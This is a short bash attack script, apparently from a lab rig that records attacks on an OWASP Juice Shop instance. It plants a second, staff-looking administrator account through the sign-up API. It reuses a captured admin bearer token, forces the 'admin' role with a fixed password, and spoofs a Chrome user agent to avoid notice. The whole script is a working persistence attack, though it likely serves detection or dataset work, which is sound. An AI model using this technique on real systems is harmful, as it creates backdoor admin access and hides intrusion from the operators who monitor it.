#!/usr/bin/env bash
# ATK-11 variant a: plants a second, staff-looking admin through the sign-up API while holding the
# admin token (setup: lib/admin-session.sh), with a browser user agent so it blends in (quiet).
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: quiet: one staff-looking admin sign-up, browser user agent
set -eu
curl -s -X POST http://10.66.0.10/api/Users -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $(cat /out/admin.token)" \
  -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
  --data-raw '{"email":"support-ops@juice-sh.op","password":"Op5-Supp0rt!2026","passwordRepeat":"Op5-Supp0rt!2026","role":"admin"}'
echo
